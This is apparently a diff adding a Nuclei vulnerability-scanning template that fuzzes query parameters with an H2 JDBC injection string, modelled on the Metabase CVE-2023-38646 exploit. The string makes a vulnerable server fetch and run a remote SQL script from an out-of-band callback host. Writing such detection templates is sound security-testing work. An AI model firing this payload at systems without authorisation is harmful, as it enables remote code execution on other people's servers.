@@ -1,0 +1,32 @@
+id: rce-via-jdbc-connection
+
+info:
+  name: RCE via JDBC Connection
+  author: reewardius
+  reference: https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
+  severity: critical
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    
+    payloads:
+      ssrf:
+        - "mem;test;INIT=RUNSCRIPT FROM 'http://{{interactsh-url}}/poc.sql"
+        
+    fuzzing:
+      - part: query
+        type: replace
+        mode: multiple
+        fuzz:
+          - "{{ssrf}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
